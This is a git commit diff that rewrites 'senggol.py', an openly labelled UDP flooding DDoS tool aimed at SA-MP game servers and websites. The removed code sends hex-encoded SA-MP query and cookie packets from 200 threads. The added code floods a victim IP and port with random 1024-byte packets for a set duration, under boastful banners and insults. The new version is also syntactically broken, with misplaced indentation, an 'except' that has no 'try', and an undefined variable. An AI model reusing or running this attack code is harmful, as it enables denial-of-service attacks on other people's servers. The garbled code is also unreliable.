22103bd077ff470fac19ca943d0eaec511f1da3b
AditXIndo <90891674+AditXIndo@users.noreply.github.com>
2021-09-24 11:37:13 +0800

    Update senggol.py

--- senggol.py
+++ senggol.py
@@ -1,83 +1,53 @@
-##KxTeam X DitDit Roleplay
-##UDP FLOODING FOD SAMP | GTPS | WEBSITE
 import socket
 import struct
-import codecs,sys
+import codecs
+import sys
 import threading
-import random
+import random 
 import time
 import os
 
+    def usage( ) :
+           print  " iii III III        IIII III III            IIIIIIIIII "
+           print  " III III   III      III  III     III     III          III "
+           print  " III III     III    III  III        III  III          III "
+           print  " III III       III  III  III        III  III          III "
+           print  " III III        III III  III     III     III          III "
+           print  " iii III           IIIII  III  III          IIIIIIIIII "
+           print  " =========================== "
+           print  "# ===SUBSCRIBE DitDit Roleplay=== #"
+           
+      def flood(victim, vport, duration):
+    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 1024 representes one byte to the server
+    bytes = random._urandom(1024)
+    timeout =  time.time() + duration
+    sent = 3000
+    
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print " Remake By S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿ %s Cie kena disenggol %s IP | PORT %s "%(sent, victim, vport)
 
-
-ip = sys.argv[1]
-port = sys.argv[2]
-orgip =ip
-
-Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
-                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
-                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
-                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
-                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
-                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
-                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
-                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
-                       ]
-
-
-os.system("clear")
-print("\033[31mCoded By DitDit Roleplay")
-print("""\033[31m
-██╗░░██╗██╗░░██╗  ████████╗███████╗░█████╗░███╗░░░███╗
-██║░██╔╝╚██╗██╔╝  ╚══██╔══╝██╔════╝██╔══██╗████╗░████║
-█████═╝░░╚███╔╝░  ░░░██║░░░█████╗░░███████║██╔████╔██║
-██╔═██╗░░██╔██╗░  ░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
-██║░╚██╗██╔╝╚██╗  ░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
-╚═╝░░╚═╝╚═╝░░╚═╝  ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝""")
-print("\033[31mDDOS KxTEAM FOR SAMP")
-print("\033[31mScript Dibuat Hanya Untuk KxTeam")
-print("\033[31mAttack By KxTeam To IP %s|%s"%(orgip,port))
-
-
-
-
-
-class MyThread(threading.Thread):
-     def run(self):
-         while True:
-                sock = socket.socket(
-                    socket.AF_INET, socket.SOCK_DGRAM)
-                
-                msg = Pacotes[random.randrange(0,5)]
-                     
-                sock.sendto(msg, (ip, int(port)))
-                
-                
-                if(int(port) == 7777):
-                    sock.sendto(Pacotes[5], (ip, int(port)))
-                elif(int(port) == 7796):
-                    sock.sendto(Pacotes[4], (ip, int(port)))
-                elif(int(port) == 7771):
-                    sock.sendto(Pacotes[6], (ip, int(port)))
-                elif(int(port) == 7784):
-                    sock.sendto(Pacotes[7], (ip, int(port)))
-                    
-                
+    def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
 
 if __name__ == '__main__':
-    try:
-     for x in range(200):                                    
-            mythread = MyThread()  
-            mythread.start()                                  
-            time.sleep(.1)    
-    except(KeyboardInterrupt):
-         os.system('cls' if os.name == 'nt' else 'clear')
-         
-         print('#########################################################################')
-         print('NGAPAIN CLOSE ANJING')
-         print('SUBSCRIBE DitDit Roleplay')
-         print('#########################################################################')
-         print('\n\n')
-         print('Ataque para ip {} foi parado'.format(orgip))
-         pass
+    main()
+
+    except KeyboardInterrupt:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print '************************'
+        print '** DDOS TOOLS S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿ **'
+        print '************************'
+        print '\n\n'
+        print ('KENA MENTAL {}').format(orgip)
